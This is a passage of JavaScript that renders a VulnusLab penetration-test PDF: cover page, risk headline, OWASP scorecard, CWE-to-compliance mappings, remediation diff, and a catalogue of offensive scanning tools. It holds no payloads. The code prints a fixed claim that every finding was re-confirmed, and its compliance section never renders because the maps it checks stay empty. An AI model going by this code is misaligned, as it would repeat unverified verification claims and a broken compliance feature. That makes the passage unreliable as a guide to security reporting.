          rrect(cx,yy+1.5,widths[i]-4,4,1,lt);
          doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...bg);
          doc.text(v.val,cx+2,yy+5);
        } else {
          doc.setFont("Arial","normal"); doc.setFontSize(8.5); doc.setTextColor(...DARK);
          const ls = doc.splitTextToSize(String(v||""),widths[i]-4);
          doc.text(ls[0],cx,yy+5);
        }
        cx+=widths[i];
      });
      return yy+7;
    };

    // ─── PAGE HEADER (pages 2+) ──────────────────────────────────
    const drawHeader = () => {
      txt((companyName||"VulnusLab")+" — Penetration Test Report",margin,10,7,GRAY);
      txt(date,pageW-margin,10,7,BLUE,false,"right");
    };

    // ════════════════════════════════════════════════════════════
    //  COVER PAGE
    // ════════════════════════════════════════════════════════════
    fillR(0,0,pageW,297,WHITE);
    // Pure black header — matches the logo PNG's black background exactly
    fillR(0,0,pageW,64,[0,0,0]);

    // Logo — custom upload or vector fallback
    {
      const cx = pageW/2, cy = 32;
      if(customLogo){
        try { doc.addImage(customLogo,"PNG",cx-28,cy-20,56,40); } catch(e){
          try { doc.addImage(customLogo,"JPEG",cx-28,cy-20,56,40); } catch(e2){}
        }
      } else {
        // VulnusLab default cover branding — shield + wordmark (drawn programmatically)
        const BLUE = [59,130,246], DBLUE = [29,78,216], PURPLE = [139,92,246];
        // Shield outline (rounded top, pointed bottom)
        doc.setFillColor(15,23,42);
        doc.setDrawColor(...BLUE); doc.setLineWidth(0.8);
        // Shield path approximated with lines
        const sx = cx, sy = cy - 14, w = 18, h = 22;
        doc.lines([
          [w*0.45,0],[w*0.55,h*0.15],[0,h*0.5],
          [-w*0.55,h*0.5],[-w*0.45,-h*0.15],[-w*0.45,-h*0.4],
          [0,-h*0.1],[w*0.45,-h*0.4],[0,h*0.4]
        ], sx-w*0.45, sy-h*0.4, [1,1], 'FD');
        // Inner highlight ring
        doc.setDrawColor(...PURPLE); doc.setLineWidth(0.3);
        doc.lines([
          [w*0.36,0],[w*0.44,h*0.12],[0,h*0.4],
          [-w*0.44,h*0.4],[-w*0.44,-h*0.32],[0,-h*0.08],[w*0.44,-h*0.32]
        ], sx-w*0.36, sy-h*0.32, [1,1], 'S');
        // V monogram
        doc.setFont("helvetica","bold"); doc.setFontSize(16); doc.setTextColor(...BLUE);
        doc.text("V", sx, sy + 2, {align:"center"});
        // Wordmark below the shield
        doc.setFont("helvetica","bold"); doc.setFontSize(11);
        doc.setTextColor(241,245,249);
        doc.text("VULNUS", sx - 2, cy + 18, {align:"right"});
        doc.setTextColor(...BLUE);
        doc.text("LAB", sx - 1, cy + 18, {align:"left"});
      }
    }
    y = 72;

    y+=5;
    txt("PENETRATION TEST REPORT",pageW/2,y,18,DARK,true,"center"); y+=10;

    // Info table on cover
    const irows=[["Target",target],["Scan Date",date],["Classification","CONFIDENTIAL"],["Prepared By","__REPORTER__"]];
    y = tableHeader(["FIELD","VALUE"],[45,135],y);
    irows.forEach((r,i)=>{
      const rh = r[1]==="__REPORTER__" ? 11 : 7;
      fillR(margin,y,contentW,rh,i%2===0?LIGHT:WHITE);
      hline(margin,y,pageW-margin,y,BORDER,0.2);
      txt(r[0],margin+3,y+(rh/2)+1.5,8.5,GRAY,true);
      if(r[0]==="Classification"){
        rrect(margin+48,y+1.5,28,4,1,RED);
        txt("CONFIDENTIAL",margin+50,y+5,7,WHITE,true);
      } else if(r[1]==="__REPORTER__"){
        // Use configured name if set; otherwise honest default that signals this is automated.
        txt(reporterName||"VulnusLab Automated Pentest",margin+48,y+4.5,8.5,DARK,true);
        txt(reporterRole||"Security Assessment Engine · vulnuslab.com",margin+48,y+9,7,GRAY,false);
      } else {
        txt(r[1],margin+48,y+(rh/2)+1.5,8.5,DARK);
      }
      y+=rh;
    });
    y+=5;

    // ─── TRUST-FIRST CONFIDENCE STATEMENT ───────────────────────
    // Sits at the very top of every customer report so the auditor's
    // first impression is the VulnusLab quality bar. No re-test button,
    // no SUSPECTED tier — every finding shipped to the PDF was actively
    // triggered, observed, and re-confirmed by the engine.
    chk(15);
    fillR(margin,y,contentW,12,[239,246,255]);
    fillR(margin,y,3,12,[37,99,235]);
    doc.setFont("Arial","bold"); doc.setFontSize(7.5); doc.setTextColor(37,99,235);
    doc.text("[VERIFIED]  VULNUSLAB",margin+6,y+5);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
    doc.text("Every finding in this report was independently triggered and re-confirmed by the VulnusLab engine.",margin+6,y+9.5);
    doc.setFont("Arial","normal"); doc.setFontSize(7); doc.setTextColor(...GRAY);
    y += 15;

    // ─── KEY RISK HEADLINE ──────────────────────────────────────
    // Single most important takeaway for the customer's CTO/auditor — they
    // open the PDF, see this box first, and instantly know what to do.
    const _allF = Array.isArray(findings) ? findings : [];
    const _topF = _allF.find(f=>f.severity==="CRITICAL") || _allF.find(f=>f.severity==="HIGH") || _allF.find(f=>f.severity==="MEDIUM") || null;
    const _critN = (summary.critical||0), _highN = (summary.high||0), _medN = (summary.medium||0);
    let _hlBgColor = [240,253,244], _hlAccent = [15,118,82], _hlTag = "POSTURE OK", _hlTitle = "No critical issues found", _hlSub = "Security posture is acceptable. Review LOW findings for hardening opportunities.";
    if (_critN > 0) {
      _hlBgColor = [254,242,242]; _hlAccent = [162,28,28]; _hlTag = "FIX IMMEDIATELY";
      _hlTitle = `${_critN} CRITICAL finding(s) — patch within 24 hours`;
      _hlSub = _topF ? (_topF.detail||"").substring(0,160) : "See Detailed Findings for full list.";
    } else if (_highN > 0) {
      _hlBgColor = [255,247,237]; _hlAccent = [133,79,11]; _hlTag = "FIX THIS WEEK";
      _hlTitle = `${_highN} HIGH finding(s) — patch within 7 days`;
      _hlSub = _topF ? (_topF.detail||"").substring(0,160) : "See Detailed Findings for full list.";
    } else if (_medN > 0) {
      _hlBgColor = [254,252,232]; _hlAccent = [120,89,15]; _hlTag = "HARDENING";
      _hlTitle = `${_medN} MEDIUM finding(s) — hardening recommended`;
      _hlSub = _topF ? (_topF.detail||"").substring(0,160) : "Review per the SLA table below.";
    }
    chk(28);
    fillR(margin,y,contentW,24,_hlBgColor);
    fillR(margin,y,3,24,_hlAccent); // left accent stripe
    doc.setFont("Arial","bold"); doc.setFontSize(7.5); doc.setTextColor(..._hlAccent);
    doc.text(_hlTag,margin+6,y+6);
    doc.setFont("Arial","bold"); doc.setFontSize(11); doc.setTextColor(...DARK);
    doc.text(_hlTitle,margin+6,y+13);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
    const _subLines = doc.splitTextToSize(String(_hlSub||""), contentW - 10);
    _subLines.slice(0,2).forEach((ln,i)=>doc.text(ln,margin+6,y+18+i*3.6));
    y += 28;

    // Summary table on cover
    y = sectionHead("Executive Summary",y);
    y = tableHeader(["SEVERITY","COUNT","SLA","RECOMMENDATION"],[35,20,25,100],y);
    [
      {s:"CRITICAL",v:summary.critical||0,sla:"24 hrs",  r:"Immediate action required"},
      {s:"HIGH",    v:summary.high||0,    sla:"7 days",  r:"Fix within 7 days"},
      {s:"MEDIUM",  v:summary.medium||0,  sla:"30 days", r:"Fix within 30 days"},
      {s:"LOW",     v:summary.low||0,     sla:"90 days", r:"Fix within 90 days"},
    ].forEach((row,i)=>{
      fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
      hline(margin,y,pageW-margin,y,BORDER,0.2);
      const [bg,lt]=sevColor(row.s);
      rrect(margin+3,y+1.5,28,4,1,lt);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...bg);
      doc.text(row.s,margin+5,y+5);
      txt(String(row.v),margin+38,y+5,11,bg,true);
      txt(row.sla,margin+58,y+5,8.5,DARK);
      txt(row.r,margin+83,y+5,8.5,DARK);
      y+=7;
    });
    y+=5;

    // ─── OWASP TOP 10 — 2021 COVERAGE SCORECARD ─────────────────
    // Net-new section. Maps every finding's OWASP tag (e.g. "A03:2021") onto
    // the 10 OWASP categories, computes a coverage grade (A-F), and shows a
    // pass/fail row per category with severity breakdown. This is the
    // single most-asked-for section by auditors and CISOs.
    const OWASP_2021 = [
      ["A01","Broken Access Control"],
      ["A02","Cryptographic Failures"],
      ["A03","Injection"],
      ["A04","Insecure Design"],
      ["A05","Security Misconfiguration"],
      ["A06","Vulnerable & Outdated Components"],
      ["A07","Identification & Authentication Failures"],
      ["A08","Software & Data Integrity Failures"],
      ["A09","Security Logging & Monitoring Failures"],
      ["A10","Server-Side Request Forgery"]
    ];
    const _owaspMap = {};
    OWASP_2021.forEach(([code]) => _owaspMap[code] = []);
    (findings || []).forEach(f => {
      const tag = String(f.owasp || "").toUpperCase();
      const m = tag.match(/A(\d{1,2})/);
      if (!m) return;
      const code = "A" + m[1].padStart(2, "0");
      if (_owaspMap[code]) _owaspMap[code].push(f);
    });
    const _failCats = OWASP_2021.filter(([c]) => _owaspMap[c].length > 0).length;
    const _passCats = 10 - _failCats;
    const _owaspGrade = _passCats >= 9 ? "A" : _passCats >= 7 ? "B" : _passCats >= 5 ? "C" : _passCats >= 3 ? "D" : "F";
    const _gradeColor = _owaspGrade === "A" ? [15,118,82] : _owaspGrade === "B" ? [22,163,74] :
                        _owaspGrade === "C" ? [202,138,4] : _owaspGrade === "D" ? [194,65,12] : [162,28,28];

    chk(95); y += 2;
    y = sectionHead("OWASP Top 10 — 2021 Coverage", y);

    // Grade summary panel — big letter grade + plain-English summary
    fillR(margin, y, contentW, 16, LIGHT);
    fillR(margin, y, 4, 16, _gradeColor); // accent stripe
    doc.setFont("Arial","bold"); doc.setFontSize(22); doc.setTextColor(..._gradeColor);
    doc.text(_owaspGrade, margin+10, y+11);
    doc.setFont("Arial","bold"); doc.setFontSize(12); doc.setTextColor(...DARK);
    doc.text(`${_passCats}/10 OWASP categories passing`, margin+28, y+7);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
    const _gradeMsg = _failCats === 0 ? "All 10 categories clear — strong security posture across OWASP Top 10." :
                      _failCats === 1 ? "1 category failing — focused remediation in the row below restores full coverage." :
                      `${_failCats} categories failing — prioritize fixes for the failed rows to improve grade.`;
    doc.text(_gradeMsg, margin+28, y+12);
    y += 19;

    // Per-category table
    y = tableHeader(["CATEGORY","NAME","STATUS","BREAKDOWN"],[20,82,22,56],y);
    OWASP_2021.forEach(([code, name], i) => {
      const matches = _owaspMap[code];
      const passing = matches.length === 0;
      const rowH = 8;
      chk(rowH + 1);
      fillR(margin, y, contentW, rowH, i%2===0 ? LIGHT : WHITE);
      hline(margin, y, pageW-margin, y, BORDER, 0.2);
      fillR(margin, y, 1.5, rowH, passing ? [15,118,82] : [162,28,28]); // pass/fail accent
      doc.setFont("Arial","bold"); doc.setFontSize(8.5); doc.setTextColor(...DARK);
      doc.text(code+":2021", margin+4, y+5.5);
      doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
      doc.text(name, margin+24, y+5.5);
      // Status pill
      const stBg = passing ? [220,252,231] : [254,226,226];
      const stFg = passing ? [15,118,82]  : [162,28,28];
      rrect(margin+106, y+1.5, 18, 5, 1, stBg);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...stFg);
      doc.text(passing ? "PASS" : "FAIL", margin+(passing?112:111.5), y+5);
      // Breakdown — severity counts when failing, plain "Clear" when passing
      if (passing) {
        doc.setFont("Arial","italic"); doc.setFontSize(7.5); doc.setTextColor(15,118,82);
        doc.text("No findings in this category", margin+128, y+5.5);
      } else {
        const sc = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
        matches.forEach(f => { if (sc[f.severity] !== undefined) sc[f.severity]++; });
        const parts = ["CRITICAL","HIGH","MEDIUM","LOW"].filter(s => sc[s] > 0).map(s => `${sc[s]} ${s}`);
        doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
        doc.text(parts.join(" · ") || `${matches.length} finding(s)`, margin+128, y+5.5);
      }
      y += rowH;
    });
    y += 5;

    // ─── COMPLIANCE COVERAGE — PCI-DSS / SOC 2 / ISO 27001 ──────
    // Maps every finding's CWE / OWASP tag onto controls in the three
    // frameworks customers' auditors actually use. For each framework,
    // shows controls VIOLATED by current findings + a sample finding.
    // CISOs forward this section straight to their compliance team.
    //
    // The mapping table is intentionally focused on the ~15 CWE classes
    // our scanners actually emit — adding more controls would be noise.
    const CWE_TO_COMPLIANCE = {
      // CWE -> [PCI-DSS v4, SOC2, ISO27001, NIST 800-53, HIPAA, GDPR, NIST CSF 2.0, CIS v8]
      "CWE-79":   ["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10",       "164.312(a)(1)",     "Art. 32 / 25",   "PR.IP-2 / DE.CM-4", "CIS 16.10"],
      "CWE-89":   ["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10 / AC-3","164.312(a)(1)",     "Art. 32 / 25",   "PR.DS-5 / PR.IP-2", "CIS 16.10 / 16.4"],
      "CWE-94":   ["6.2.4",        "CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-352":  ["6.2.4",        "CC6.1","A.5.15","SC-23",       "164.312(d)",        "Art. 32",        "PR.AC-7",           "CIS 16.5"],
      "CWE-1021": ["6.4.3",        "CC6.6","A.8.23","SC-7",        "164.312(a)(1)",     "Art. 32",        "PR.AC-5",           "CIS 16.10"],
      "CWE-200":  ["3.4.1",        "CC6.1","A.5.10","SC-8 / AC-3", "164.312(e)(1)",     "Art. 32 / 33",   "PR.DS-1 / PR.DS-2", "CIS 3.3 / 16.10"],
      "CWE-319":  ["4.2.1",        "CC6.7","A.8.24","SC-8 / SC-13","164.312(e)(1)",     "Art. 32",        "PR.DS-2",           "CIS 3.10 / 13.6"],
      "CWE-942":  ["6.2.4 / 6.4.1","CC6.6","A.8.23","SC-7 / AC-3", "164.312(a)(1)",     "Art. 32",        "PR.AC-5",           "CIS 16.10"],
      "CWE-639":  ["7.2 / 8.2.5",  "CC6.1","A.5.15","AC-3 / AC-6", "164.312(a)(1)",     "Art. 32 / 25",   "PR.AC-4",           "CIS 16.8"],
      "CWE-444":  ["6.2.4",        "CC6.6","A.8.21","SC-7 / SI-10","164.312(e)(1)",     "Art. 32",        "PR.AC-5",           "CIS 16.10"],
      "CWE-538":  ["2.2.7 / 6.4.1","CC6.1","A.5.10","AC-3 / AC-6", "164.312(a)(1)",     "Art. 32 / 25",   "PR.DS-1 / PR.AC-4", "CIS 3.7 / 13.6"],
      "CWE-693":  ["6.2.4",        "CC6.6","A.8.23","SC-7 / SI-10","164.312(a)(1)",     "Art. 32",        "PR.IP-1",           "CIS 16.10"],
      "CWE-650":  ["6.2.4",        "CC6.1","A.8.21","AC-3 / SC-7", "164.312(a)(1)",     "Art. 32",        "PR.AC-5",           "CIS 16.10"],
      "CWE-1004": ["8.3.10",       "CC6.7","A.8.5", "SC-23 / IA-2","164.312(d)",        "Art. 32",        "PR.AC-7",           "CIS 16.5"],
      "CWE-614":  ["4.2.1 / 8.3.10","CC6.7","A.8.5","SC-8 / SC-23","164.312(e)(1)",    "Art. 32",        "PR.DS-2",           "CIS 3.10 / 16.5"],
      "CWE-601":  ["6.2.4",        "CC6.6","A.8.21","SI-10 / SC-7","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-918":  ["6.2.4",        "CC6.6","A.8.23","SC-7 / SI-10","164.312(a)(1)",     "Art. 32",        "PR.AC-5",           "CIS 16.10"],
      "CWE-611":  ["6.2.4",        "CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-78":   ["6.2.4",        "CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-22":   ["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10 / AC-3","164.312(a)(1)",     "Art. 32 / 25",   "PR.AC-4 / PR.IP-2", "CIS 16.10 / 3.7"],
      "CWE-434":  ["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-502":  ["6.2.4",        "CC6.6","A.8.28","SI-10 / SI-3","164.312(a)(1)",     "Art. 32",        "PR.IP-2",           "CIS 16.10"],
      "CWE-287":  ["7.2 / 8.2",    "CC6.1","A.5.15","IA-2 / AC-7", "164.312(d)",        "Art. 32 / 25",   "PR.AC-1 / PR.AC-7", "CIS 6.3 / 16.3"],
      "CWE-307":  ["8.3.4",        "CC6.1","A.5.17","AC-7 / IA-5", "164.312(a)(2)(i)",  "Art. 32",        "PR.AC-7",           "CIS 6.6"],
      "CWE-384":  ["8.3.10",       "CC6.7","A.5.15","SC-23 / IA-2","164.312(d)",        "Art. 32",        "PR.AC-7",           "CIS 16.5"],
      "CWE-1275": ["8.3.10",       "CC6.7","A.8.5", "SC-23",       "164.312(d)",        "Art. 32",        "PR.AC-7",           "CIS 16.5"],
      "CWE-16":   ["2.2.4",        "CC6.6","A.8.9", "CM-6 / CM-7", "164.308(a)(1)",     "Art. 32 / 25",   "PR.IP-1",           "CIS 4.1 / 4.2"],
      "CWE-1395": ["6.3.3 / 6.5.6","CC7.1","A.8.8", "SI-2 / RA-5", "164.308(a)(5)",     "Art. 32",        "ID.RA-1 / PR.IP-12","CIS 7.1 / 7.3"],
    };
    // Walk current findings, collect which controls are touched per framework.
    const _pci = new Map(), _soc = new Map(), _iso = new Map();
    const _push = (m, ctrl, f) => {
      if (!ctrl) return;
      // Split on " / " so a CWE that maps to multiple controls registers each one.
      ctrl.split(/\s*\/\s*/).forEach(c => {
        if (!m.has(c)) m.set(c, []);
        m.get(c).push(f);
      });
    };
    const _FRAMEWORKS = [
      {name:"PCI-DSS v4.0",          blurb:"Payment Card Industry — Req 6 (Secure Systems) & Req 8 (Access)"},
      {name:"SOC 2 (Trust Services)", blurb:"AICPA Common Criteria — CC6 (Logical & Physical Access)"},
      {name:"ISO 27001:2022",        blurb:"Annex A controls — A.5/8/14 (Org, People, Tech)"},
      {name:"NIST 800-53 Rev 5",     blurb:"US federal security controls — SI/SC/AC/IA control families"},
      {name:"HIPAA Security Rule",   blurb:"45 CFR 164.308/312 — administrative & technical safeguards"},
      {name:"GDPR",                  blurb:"EU privacy — Art. 32 (security), 25 (by-design), 33 (breach)"},
      {name:"NIST CSF 2.0",          blurb:"Cybersecurity Framework — IDENTIFY/PROTECT/DETECT/RESPOND"},
      {name:"CIS Controls v8",       blurb:"Center for Internet Security — 18 critical controls"},
    ];
    const _frameworkMaps = _FRAMEWORKS.map(() => new Map());
    (findings || []).forEach(f => {
      const cwe = String(f.cwe || "").trim().toUpperCase();
      const map = CWE_TO_COMPLIANCE[cwe];
      if (!map) return;
      _FRAMEWORKS.forEach((fw, i) => _push(_frameworkMaps[i], map[i], f));
    });

    // Render only when something maps — empty section is just noise.
    const _hasAny = _pci.size + _soc.size + _iso.size > 0;
    if (_hasAny) {
      chk(70); y += 2;
      y = sectionHead("Compliance Coverage",y);
      doc.setFont("Arial","italic"); doc.setFontSize(7); doc.setTextColor(...GRAY);
      doc.text("Findings mapped onto 8 frameworks: PCI-DSS v4.0, SOC 2, ISO 27001:2022, NIST 800-53, HIPAA, GDPR, NIST CSF 2.0, CIS Controls v8.", margin+2, y);
      doc.setFont("Arial","normal");
      y += 4;

      const _renderFw = (name, blurb, controlsMap) => {
        if (controlsMap.size === 0) return;
        chk(controlsMap.size * 7 + 14);
        // Framework banner row
        fillR(margin, y, contentW, 7, [30,64,175]);
        doc.setFont("Arial","bold"); doc.setFontSize(8.5); doc.setTextColor(...WHITE);
        doc.text(name, margin+3, y+5);
        doc.setFont("Arial","normal"); doc.setFontSize(7); doc.setTextColor(218,234,254);
        doc.text(blurb, margin+62, y+5);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...WHITE);
        doc.text(`${controlsMap.size} control(s) impacted`, pageW-margin-3, y+5, {align:"right"});
        y += 7;
        // Per-control rows
        const sorted = Array.from(controlsMap.entries()).sort((a,b)=>b[1].length - a[1].length);
        sorted.forEach(([ctrl, fs], i) => {
          chk(7);
          fillR(margin, y, contentW, 6.5, i%2===0 ? LIGHT : WHITE);
          hline(margin, y, pageW-margin, y, BORDER, 0.2);
          fillR(margin, y, 1.5, 6.5, [162,28,28]);
          doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...DARK);
          doc.text(ctrl, margin+4, y+4.5);
          // Count + worst severity
          const sevs = fs.map(f=>f.severity);
          const worst = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"].find(s => sevs.includes(s)) || "LOW";
          const [bg,lt] = sevColor(worst);
          rrect(margin+28, y+1.5, 18, 5, 1, lt);
          doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...bg);
          doc.text(worst, margin+29, y+5);
          // Sample finding
          const sample = (fs[0].detail || "").substring(0, 95);
          doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
          doc.text(`${fs.length} finding(s): ${sample}`, margin+50, y+4.5);
          y += 6.5;
        });
        y += 4;
      };

      _FRAMEWORKS.forEach((fw, i) => _renderFw(fw.name, fw.blurb, _frameworkMaps[i]));
    }

    // ─── REMEDIATION PROGRESS — diff vs previous scan ───────────
    // Shown only when a previous scan exists. The CTO opens this report after
    // their team has fixed things and sees exactly what changed since last time.
    // Three buckets: FIXED (in prev but not current), NEW (current but not prev),
    // PERSISTING (in both). Each bucket gets a colored banner with count + the
    // top-severity sample so the customer can act on the deltas immediately.
    if (remediation && (remediation.fixed.length + remediation.novel.length + remediation.persisting.length > 0)) {
      chk(60); y += 2;
      y = sectionHead("Remediation Progress",y);

      // Header strip — context line
      doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
      doc.text(`Compared against previous scan on ${remediation.prevDate || "an earlier date"} (${remediation.prevTotal} findings then).`, margin+2, y);
      doc.setFont("Arial","bold");
      y += 5;

      // Three KPI tiles side-by-side
      const tileW = (contentW - 4) / 3;
      const _tile = (idx, color, bg, count, label, sample) => {
        const x = margin + idx * (tileW + 2);
        fillR(x, y, tileW, 20, bg);
        fillR(x, y, 3, 20, color);
        doc.setFont("Arial","bold"); doc.setFontSize(18); doc.setTextColor(...color);
        doc.text(String(count), x+8, y+11);
        doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...DARK);
        doc.text(label, x+8 + (count>=10?12:8), y+8);
        doc.setFont("Arial","normal"); doc.setFontSize(7); doc.setTextColor(...GRAY);
        const sLines = doc.splitTextToSize(sample || "", tileW - 12);
        if (sLines[0]) doc.text(sLines[0], x+8 + (count>=10?12:8), y+13);
        if (sLines[1]) doc.text(sLines[1], x+8 + (count>=10?12:8), y+16.5);
      };
      const fixedTop = remediation.fixed.find(f=>f.severity==="CRITICAL")||remediation.fixed.find(f=>f.severity==="HIGH")||remediation.fixed[0];
      const newTop   = remediation.novel.find(f=>f.severity==="CRITICAL")||remediation.novel.find(f=>f.severity==="HIGH")||remediation.novel[0];
      const persTop  = remediation.persisting.find(f=>f.severity==="CRITICAL")||remediation.persisting.find(f=>f.severity==="HIGH")||remediation.persisting[0];
      _tile(0, [15,118,82],  [220,252,231], remediation.fixed.length,      "FIXED",
            fixedTop ? `e.g. ${(fixedTop.detail||"").substring(0,70)}` : "Nothing fixed since last scan.");
      _tile(1, [162,28,28],  [254,226,226], remediation.novel.length,      "NEW",
            newTop   ? `e.g. ${(newTop.detail||"").substring(0,70)}`   : "No new findings — posture stable.");
      _tile(2, [120,89,15],  [254,243,199], remediation.persisting.length, "STILL OPEN",
            persTop  ? `e.g. ${(persTop.detail||"").substring(0,70)}`  : "All previous findings resolved.");
      y += 23;

      // Narrative one-liner — picks the story to tell based on the deltas
      const _net = remediation.fixed.length - remediation.novel.length;
      let _story = "";
      if (remediation.fixed.length === 0 && remediation.novel.length === 0) {
        _story = "No change since last scan — same set of findings still open.";
      } else if (_net > 0) {
        _story = `Net improvement: ${_net} more issue${_net===1?"":"s"} fixed than introduced since last scan.`;
      } else if (_net < 0) {
        _story = `Net regression: ${Math.abs(_net)} more new issue${Math.abs(_net)===1?"":"s"} than fixes since last scan. Investigate recent deployments.`;
      } else {
        _story = `Even trade: ${remediation.fixed.length} fixed and ${remediation.novel.length} new findings since last scan.`;
      }
      doc.setFont("Arial","italic"); doc.setFontSize(8); doc.setTextColor(...DARK);
      const _stLines = doc.splitTextToSize(_story, contentW - 4);
      _stLines.slice(0,2).forEach((ln,i)=>doc.text(ln, margin+2, y + i*3.8));
      y += _stLines.length * 3.8 + 4;
    }

    // Tools used table on cover
    if(toolsUsed&&toolsUsed.length>0){
      y = sectionHead("Tools Used",y);
      y = tableHeader(["TOOL","PURPOSE","COST"],[40,110,30],y);
      const toolInfo={
        wafw00f:     ["WAF Detection & Fingerprinting","FREE"],
        whatweb:     ["Technology Stack Fingerprinting","FREE"],
        nmap:        ["Port & Service Scanning","FREE"],
        gobuster:    ["Directory & File Enumeration","FREE"],
        nikto:       ["Web Vulnerability Scanning","FREE"],
        sqlmap:      ["SQL Injection Testing","FREE"],
        dig:         ["DNS Enumeration","FREE"],
        sslscan:     ["SSL/TLS Configuration Analysis","FREE"],
        ssl:         ["SSL/TLS Configuration Analysis","FREE"],
        curl:        ["Security Headers & Cookie Analysis","FREE"],
        headers:     ["HTTP Security Headers Check","FREE"],
        cookies:     ["Cookie Security Flags Analysis","FREE"],
        cors:        ["CORS Misconfiguration Testing","FREE"],
        xsser:       ["XSS (Cross-Site Scripting) Testing","FREE"],
        xss:         ["XSS (Cross-Site Scripting) Testing","FREE"],
        sublist3r:   ["Subdomain Discovery & Enumeration","FREE"],
        subdomains:  ["Subdomain Discovery & Enumeration","FREE"],
        cms:         ["CMS Detection & Version Analysis","FREE"],
        theharvester:["OSINT & Email Recon","FREE"],
        whois:       ["Domain WHOIS Lookup","FREE"],
        masscan:     ["Fast Network Port Scanning","FREE"],
        dnsrecon:    ["DNS Reconnaissance","FREE"],
        dirb:        ["Directory Brute Force","FREE"],
        wfuzz:       ["Web Application Fuzzing","FREE"],
        nuclei: ["Community Vuln Templates (15k+ checks)","FREE"],
        ffuf:         ["Fast Web Fuzzer / Directory Brute Force","FREE"],
        wpscan:       ["WordPress Vulnerability Scanning","FREE"],
        arjun:        ["HTTP Parameter Discovery","FREE"],
        commix:       ["OS Command Injection Testing","FREE"],
        lfi:          ["Path Traversal / LFI Testing","FREE"],
        openredirect: ["Open Redirect Detection","FREE"],
        sensitivefiles:["Sensitive File Exposure Detection","FREE"],
        hydra:        ["Authentication Brute Force Testing","FREE"],
        ssrf:         ["Server-Side Request Forgery Testing","FREE"],
        xxe:          ["XML External Entity Injection Testing","FREE"],
        clickjacking: ["Clickjacking / UI Redress Detection","FREE"],
        verbtamper:   ["HTTP Verb Tampering Analysis","FREE"],
        pollution:    ["HTTP Parameter Pollution Testing","FREE"],
        csrf:         ["Cross-Site Request Forgery Testing","FREE"],
        idor:         ["Insecure Direct Object Reference Testing","FREE"],
        ssti:         ["Server-Side Template Injection Testing","FREE"],
        fileupload:   ["File Upload Vulnerability Testing","FREE"],
        dataexfil:    ["Data Exfiltration Channel Detection","FREE"],
        racecondition:["Race Condition Vulnerability Testing","FREE"],
        rfi:          ["Remote File Inclusion Testing","FREE"],
        deserial:     ["Insecure Deserialization Detection","FREE"],
        smuggling:    ["HTTP Request Smuggling Detection","FREE"],
        responsesplitting:["HTTP Response Splitting Testing","FREE"],
        sessionfixation:  ["Session Fixation Detection","FREE"],
        smb:          ["SMB Share & Service Enumeration","FREE"],
        ftp:          ["FTP Service Enumeration","FREE"],
        smtp:         ["SMTP User Enumeration","FREE"],
        snmp:         ["SNMP Community String Testing","FREE"],
        exploitsearch:["Known Exploit & CVE Search","FREE"],
        protopollution:["Prototype Pollution Testing","FREE"],
        typejuggling: ["PHP Type Juggling Detection","FREE"],
        jwt:          ["JWT Token Attack Testing","FREE"],
        graphql:      ["GraphQL Security Assessment","FREE"],
        nosql:        ["NoSQL Injection Testing","FREE"],
        oauth:        ["OAuth 2.0 / SAML Attack Testing","FREE"],
        hostheader:   ["Host Header Injection Testing","FREE"],
        websocket:    ["WebSocket Security Assessment","FREE"],
        takeover:     ["Subdomain Takeover Detection","FREE"],
        otp:          ["2FA / OTP Bypass Testing","FREE"],
        // Vuln scanner backend tools (newer additions)
        dns:              ["DNS Records & Configuration Lookup","FREE"],
        techstack:        ["Technology Stack Fingerprinting","FREE"],
        portscan:         ["TCP Port Scanning","FREE"],
        ssl_cert:         ["SSL/TLS Certificate Audit","FREE"],
        sqli:             ["SQL Injection (error/boolean/time-based)","FREE"],
        cmd_injection:    ["OS Command Injection (OOB canary)","FREE"],
        exposed_files:    [".env / .git / backup / config exposure","FREE"],
        http_methods:     ["Dangerous HTTP Verbs (TRACE/PUT/DELETE)","FREE"],
        open_redirect:    ["Open Redirect (host-verified)","FREE"],
        mass_assignment:  ["Mass Assignment / Param Allow-list Bypass","FREE"],
        access_control:   ["Access Control / Authorization Bypass","FREE"],
        force_browse:     ["Forced Browsing / Hidden Paths","FREE"],
        file_upload:      ["File Upload Validation Bypass","FREE"],
        sensitive_data:   ["Sensitive Data Exposure (PII/secrets in responses)","FREE"],
        stored_xss:       ["Stored XSS via Persistence Endpoints","FREE"],
        spa_crawler:      ["SPA Endpoint Crawler (React/Vue/Angular)","FREE"],
        headers:          ["HTTP Security Headers (CSP/HSTS/XFO)","FREE"],
        cookies:          ["Cookie Attribute Audit (Secure/HttpOnly/SameSite)","FREE"],
      };
      for(let i=0;i<toolsUsed.length;i++){
